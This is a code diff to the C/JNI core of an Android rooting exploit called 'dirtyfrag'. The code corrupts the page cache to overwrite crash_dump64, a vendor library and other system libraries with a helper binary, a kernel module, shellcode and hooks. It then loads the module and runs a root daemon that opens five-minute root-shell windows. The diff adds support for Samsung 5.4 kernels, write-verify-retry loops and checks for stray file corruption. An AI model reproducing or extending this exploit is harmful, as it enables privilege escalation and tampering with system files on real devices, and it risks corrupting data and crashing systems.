@@ -10,9 +10,11 @@
 #include <sys/syscall.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/un.h>
 #include <sys/uio.h>
 #include <sys/wait.h>
 #include <sys/stat.h>
+#include <time.h>
 #include <sys/utsname.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -64,6 +66,7 @@ static uint8_t  g_aes_key[32];
 static uint8_t  g_hmac_key[32];
 static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
 static uint32_t g_seq = 1;   /* monotonically increasing per-write */
+int             g_fast_mode;  /* boot: skip serve window + cleanup */
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
@@ -275,8 +278,13 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
             REPORTLN("write #%zu at 0x%lx failed", i, (long)off);
             rc = -1; break;
         }
-        if (i % 32 == 0)
+        if (i % 32 == 0) {
             REPORTLN("%zu ...", i * 16);
+            /* o1s v77: throttle splice burst HARD (300ms/512B). v74's
+             * 200ms didn't stop OOM-kills (#142: malloc-fail SIGSEGVs in
+             * daemons+init, no hook involved). Reap (Java) + throttle. */
+            usleep(300000);
+        }
     }
 
     if (!use_helper) close(file_fd);
@@ -316,6 +324,8 @@ asm(
     "dirtyfrag_ko_16_6_12_start:\n.incbin \"ko/dirtyfrag-android16-6.12.ko\"\ndirtyfrag_ko_16_6_12_end:\n"
     ".global dirtyfrag_ko_17_6_18_start\n.global dirtyfrag_ko_17_6_18_end\n"
     "dirtyfrag_ko_17_6_18_start:\n.incbin \"ko/dirtyfrag-android17-6.18.ko\"\ndirtyfrag_ko_17_6_18_end:\n"
+    ".global dirtyfrag_ko_15_5_4_start\n.global dirtyfrag_ko_15_5_4_end\n"
+    "dirtyfrag_ko_15_5_4_start:\n.incbin \"ko/dirtyfrag-android15-5.4.ko\"\ndirtyfrag_ko_15_5_4_end:\n"
 );
 
 asm(
@@ -332,6 +342,7 @@ extern char dirtyfrag_ko_14_6_1_start[],  dirtyfrag_ko_14_6_1_end[];
 extern char dirtyfrag_ko_15_6_6_start[],  dirtyfrag_ko_15_6_6_end[];
 extern char dirtyfrag_ko_16_6_12_start[], dirtyfrag_ko_16_6_12_end[];
 extern char dirtyfrag_ko_17_6_18_start[], dirtyfrag_ko_17_6_18_end[];
+extern char dirtyfrag_ko_15_5_4_start[], dirtyfrag_ko_15_5_4_end[];
 extern char splice_helper_start[], splice_helper_end[];
 
 struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };
@@ -346,6 +357,7 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
         {15, 6,  6, dirtyfrag_ko_15_6_6_start,  dirtyfrag_ko_15_6_6_end},
         {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
         {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
+        {15, 5, 4, dirtyfrag_ko_15_5_4_start, dirtyfrag_ko_15_5_4_end},
     };
     const struct KoImage *fb = NULL;
     for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
@@ -361,9 +373,22 @@ static int read_device_versions(int *andr, int *major, int *minor) {
     if (uname(&u) != 0) return -1;
     if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
     const char *m = strstr(u.release, "android");
-    if (!m) return -1;
-    *andr = atoi(m + 7);
-    return (*andr > 0) ? 0 : -1;
+    if (m) {
+        *andr = atoi(m + 7);
+        return (*andr > 0) ? 0 : -1;
+    }
+    /* Samsung kernels (e.g. 5.4.242-30958140-abG991BXXSJHZC2) carry no
+     * "android" marker: fall back to ro.build.version.release (needs
+     * <sys/system_properties.h>, stable NDK API). o1s/HZC2 -> 15. */
+    {
+        char val[92] = { 0 };
+        extern int __system_property_get(const char *, char *);
+        if (__system_property_get("ro.build.version.release", val) > 0) {
+            *andr = atoi(val);
+            return (*andr > 0) ? 0 : -1;
+        }
+    }
+    return -1;
 }
 
 /* Pad payload to a multiple of 16 bytes in a heap buffer.
@@ -377,6 +402,49 @@ static char *pad16(const char *data, size_t len, size_t *out_len) {
     return buf;
 }
 
+
+/* o1s: pread-based verify for app-readable targets (apex/system libs).
+ * Returns bad-block count. */
+static size_t patch_verify_pread(const char *path, const char *payload,
+                                 size_t len, size_t foff,
+                                 struct Reporter *reporter) {
+    int fd = open(path, O_RDONLY);
+    size_t bad = 0;
+    if (fd < 0)
+        return (size_t)-1;
+    for (size_t i = 0; i < len; i += 16) {
+        uint8_t rb[16];
+        if (pread(fd, rb, 16, (off_t)(foff + i)) != 16 ||
+            memcmp(rb, payload + i, 16) != 0) {
+            if (bad < 4)
+                REPORTLN("verify: MISMATCH %s+0x%zx", path, foff + i);
+            bad++;
+        }
+    }
+    close(fd);
+    return bad;
+}
+
+/* o1s: write + verify + retry (loopback UDP can drop post-splice packets
+ * before ESP decrypt; recompute IVs from current content each round). */
+static int g_round0_bad = 0; /* o1s v72: stray-write meter (see below) */
+static int patch_checked(const char *path, const char *payload, size_t len,
+                         size_t foff, struct Reporter *reporter) {
+    for (int round = 0; round < 5; round++) {
+        int rc = patch_file_cbc(path, payload, len, foff, 0, reporter);
+        if (rc)
+            return rc;
+        size_t bad = patch_verify_pread(path, payload, len, foff, reporter);
+        REPORTLN("verify %s: %zu/%zu bad (round %d)", path, bad, len / 16,
+                 round);
+        if (round == 0)
+            g_round0_bad += (int)bad;
+        if (!bad)
+            return 0;
+        usleep(200000);
+    }
+    return -1;
+}
 
 static int patch_ko(struct Reporter *reporter) {
     /* pick KO image */
@@ -401,7 +469,7 @@ static int patch_ko(struct Reporter *reporter) {
                          &sh_len_padded);
     if (!sh_buf) return -1;
     REPORTLN("* patch #1 (crash_dump64 ← splicehelper, %zu bytes)", sh_len_padded);
-    int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
+    int ret = patch_checked(kCrashDump, sh_buf, sh_len_padded, 0, reporter);
     free(sh_buf);
     if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
 
@@ -409,11 +477,38 @@ static int patch_ko(struct Reporter *reporter) {
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
     if (!ko_buf) return -1;
 
-    /* patch #2: write KO into vendor lib via crash_dump bridge */
-    REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
+    /* patch #2: write KO into vendor lib via crash_dump bridge.
+     * Loopback UDP can drop a packet after splice but before ESP decrypt
+     * (service never drains its encap socket): rewrite + re-verify until
+     * clean, recomputing IVs from current content each round. */
+    int round;
+    for (round = 0; round < 5; round++) {
+    REPORTLN("* patch #2 round %d (%s <- dirtyfrag.ko, %zu bytes)", round, libcxx_ko_target, ko_len_padded);
     ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
-    free(ko_buf);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
+    /* o1s verify: read back via bridge, memcmp against what we wrote */
+    if (!ret) {
+        size_t bad = 0;
+        for (size_t i = 0; i < ko_len_padded; i += 16) {
+            uint8_t rb[16];
+            if (read_vendor_content((off_t)i, rb, reporter) < 0) {
+                REPORTLN("verify: readback failed at 0x%zx", i);
+                bad++;
+                break;
+            }
+            if (memcmp(rb, ko_buf + i, 16) != 0) {
+                if (bad < 4)
+                    REPORTLN("verify: MISMATCH at 0x%zx", i);
+                bad++;
+            }
+        }
+        REPORTLN("verify: %zu/%zu bad blocks", bad, ko_len_padded / 16);
+        if (!bad)
+            break;
+        usleep(200000);
+    }
+    }
+    free(ko_buf);
     return ret;
 }
 
@@ -457,7 +552,7 @@ static int patch_hook(const char *lib, const char *sym,
     }
 
     REPORTLN("* patching %s shellcode", lib);
-    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, reporter);
+    int ret = patch_checked(lib, buf, padded, shell_off, reporter);
     free(buf);
     if (ret) { REPORTLN("* patching %s shellcode failed", lib); return ret; }
 
@@ -480,7 +575,7 @@ static int patch_hook(const char *lib, const char *sym,
         blk[pos+2] = (uint8_t)(hook_insn >> 16);
         blk[pos+3] = (uint8_t)(hook_insn >> 24);
         REPORTLN("* patching %s trampoline at 0x%lx", lib, hook_off);
-        ret = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
+        ret = patch_checked(lib, (char *)blk, 16, (size_t)aligned, reporter);
     }
     return ret;
 }
@@ -517,6 +612,47 @@ static int createOrphanProcess(struct Reporter *reporter) {
 
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
+/* v82f auto-ladder: talk to our own daemon BEFORE cleanup (restore-kill
+ * lesson: post-cleanup probes can never work — the worker sleeps through
+ * restore and crashes on wakeup. Human timing missed the window 3 nights
+ * running, so the app now probes itself deterministically, in-window.
+ * Pure libc, no JNI. reporter = nativeRunAll's `reporter` variable. */
+static int sud_connect(void) {
+    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
+    struct sockaddr_un a;
+    if (fd < 0) return -1;
+    memset(&a, 0, sizeof(a));
+    a.sun_family = AF_UNIX;
+    strcpy(a.sun_path, "/dev/.sud");
+    if (connect(fd, (struct sockaddr *)&a, sizeof(a)) < 0) {
+        close(fd);
+        return -1;
+    }
+    return fd;
+}
+static void auto_ladder(struct Reporter *reporter) {
+    int fd;
+    REPORTLN("=== AUTO-LADDER (in-window, pre-cleanup) ===");
+    /* probe-only (o1s): echo/touch ladder adimlari kaldirildi, grant
+     * dogrudan sh-exec uzerinden calisiyor. Sifir-fork probe kok
+     * dogrulamasi olarak duruyor. */
+    fd = sud_connect();
+    if (fd < 0) {
+        REPORTLN("probe: CONNECT FAILED");
+    } else {
+        shutdown(fd, SHUT_WR);
+        close(fd);
+        sleep(3);
+        REPORTLN("probe: dfROOTED %s, dfPROBE(accepted) %s",
+                 has_marker("/dev/dfROOTED") ? "YES ***ROOTED***" : "NO",
+                 has_marker("/dev/dfPROBE") ? "true" : "false");
+    }
+}
+static int is_fresh(const char *p, time_t t0) {
+    struct stat st;
+    return stat(p, &st) == 0 && st.st_mtime >= t0;
+}
+
 JNIEXPORT jint JNICALL
 Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
                                                jobject reporter_obj,
@@ -525,7 +661,8 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
                                                jbyteArray aesCbcKey,
                                                jbyteArray hmacKey, jint icvLen,
                                                jint senderPort,
-                                               jboolean softReboot) {
+                                               jboolean softReboot,
+                                               jboolean fastMode) {
     struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
 
     g_encap_port  = (int)encapPort;
@@ -551,6 +688,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
     }
     libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
     *libcxx_soft_reboot = softReboot ? 1 : 0;
+    g_fast_mode = fastMode ? 1 : 0;
 
     struct PatchRestore libcxx_r = {0};
 
@@ -563,6 +701,18 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
 
     rc = 2;
     usleep(500000);
+    /* o1s v72 stray filter: round-0 mismatches mean splice blocks
+     * landed wrong (somewhere!); retries fix the TARGET files but the
+     * stray victims stay corrupt (zram BUG_ON #133-139 proven pattern).
+     * Abort disasters (>150 first-try bad blocks); the rest proceed at
+     * residual risk. This gate, not retries, decides trigger-worthiness.
+     */
+    REPORTLN("stray meter: %d round-0 bad blocks", g_round0_bad);
+    if (g_round0_bad > 150) {
+        REPORTLN("***ABORT***: page cache too confused (strays certain)");
+        rc = 3;
+        goto done;
+    }
     REPORTLN("* triggering...");
     createOrphanProcess(reporter);
 
@@ -570,29 +720,86 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
         const char *path;
         const char *msg;
         int         rc;
+        int         need_fresh; /* accept only if mtime >= trigger time */
     } markers[] = {
-        { "/dev/df",   "libc++: mutex acquired, loading custom module", -1 },
-        { "/dev/dfm0", "***SUCCESS***",                        0 },
-        { "/dev/dfm1", "***FAILED***: ksud exited with error", 1 },
+        { "/dev/df",   "libc++: mutex acquired, loading custom module", -1, 0 },
+        { "/dev/dfH",   "hook: fired fresh this run", -1, 0 },
+        { "/dev/dfgE", "stage: grandchild reached execve", -1, 0 },
+        { "/dev/dfWB", "ko: zram writeback closed (minefield mitigation)", -1, 0 },
+        { "/dev/dfr0", "stage: insmod exit 0", -1, 0 },
+        { "/dev/dfr1", "stage: insmod exit NONZERO", -1, 0 },
+        { "/dev/dfPROBE", "stage: daemon accepted a client", -1, 0 },
+        { "/dev/dfws", "stage: client wait-status recorded", -1, 0 },
+        { "/dev/dfr127", "sud: insmod exec FAILED (127)", -1, 0 },
+        { "/dev/dfr200", "sud: insmod killed by signal", -1, 0 },
+        { "/dev/dfm0", "sud daemon serving", -1, 0 },
+        { "/dev/dfU0", "ko: UMH-bare works (root exec proven!)", -1, 0 },
+        { "/dev/dfL0", "sud: load_ko entered", -1, 0 },
+        { "/dev/dfLF", "sud: fork FAILED", -1, 0 },
+        { "/dev/dfLC", "sud: child alive", -1, 0 },
+        { "/dev/dfLE", "sud: child exec-ing insmod", -1, 0 },
+        { "/dev/dfLW", "sud: parent waiting", -1, 0 },
+        { "/dev/dfX0", "stage: sud child alive, attempting exec", -1, 0 },
+        { "/dev/dfBT", "sud: bind TIMEOUT (50s)", -1, 0 },
+        { "/dev/dfLI", "sud: listen FAILED", -1, 0 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
+    time_t t0 = time(NULL);
+    /* o1s v52+: ko FIRST (dfr0), sud SECOND (dfm0). SUCCESS needs BOTH:
+     * ko without daemon = permissive only; daemon without ko = useless.
+     * (v38's sud-first broke ko-first and stranded permissive.) */
+    int saw_dfm0 = 0, saw_dfr0 = 0, saw_dfwb = 0;
 
-    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
+    /* o1s: 30s marker window (user demand: 90s watched nothing happen).
+     * Healthy chain completes in <10s. */
+    for (int elapsed = 0; elapsed < 30000; elapsed += 10) {
         usleep(10000);
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
-            if (!seen[j] && has_marker(markers[j].path)) {
+            if (seen[j] || !has_marker(markers[j].path)) continue;
+            if (markers[j].need_fresh && !is_fresh(markers[j].path, t0)) {
+                if (!seen[j]) REPORTLN("(stale %s present, ignoring)", markers[j].path);
                 seen[j] = 1;
-                REPORTLN("%s", markers[j].msg);
-                if (markers[j].rc >= 0) {
-                    rc = markers[j].rc;
-                    goto done;
+                continue;
+            }
+            seen[j] = 1;
+            REPORTLN("%s", markers[j].msg);
+            if (!strcmp(markers[j].path, "/dev/dfm0")) saw_dfm0 = 1;
+            if (!strcmp(markers[j].path, "/dev/dfr0")) saw_dfr0 = 1;
+            if (!strcmp(markers[j].path, "/dev/dfWB")) saw_dfwb = 1;
+            if (saw_dfm0 && saw_dfr0) {
+                rc = 0;
+                REPORTLN("***SUCCESS*** (daemon + ko confirmed, wb-closed: %s)",
+                         saw_dfwb ? "YES" : "NO");
+                auto_ladder(reporter);
+                /* Fast mode (boot): 300s serve BEKLENMEZ ama cleanup
+                 * ILLAKI yapilir. Worker cleanup'ta olur (beklenen);
+                 * kko + mount'lar zaten uygulanmistir. */
+                if (!g_fast_mode) {
+                    /* Serve window (v83: 300s shell sessions): the worker dies
+                 * at cleanup, so the daemon's lifetime = this window. Each
+                 * RUN buys one ~5min root-shell session (reboot per session;
+                 * poisoned files across reboot just auto-fire next boot).
+                 * Mine risk grows with window length; 300s is the trade. */
+                for (int w = 0; w < 10; w++) {
+                    REPORTLN("=== SHELL %ds: shell window open ===",
+                             300 - w * 30);
+                    sleep(30);
                 }
+                }
+                goto done;
+            }
+            if (markers[j].rc >= 0 && strcmp(markers[j].path, "/dev/dfm0")) {
+                rc = markers[j].rc;
+                goto done;
             }
         }
     }
     REPORTLN("***FAILED***: check logs");
 done:
     if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
+    /* o1s v76: cleanup ALWAYS (user demand, old behavior). Daemon-less
+     * runs have nothing in flight worth protecting; poisoned pages
+     * confuse the next attempt more than restore IO costs. */
     REPORTLN("\n=== cleanup ===");
     restore_hook(&libcxx_r, reporter);
     fadvise_drop(kCrashDump, reporter);
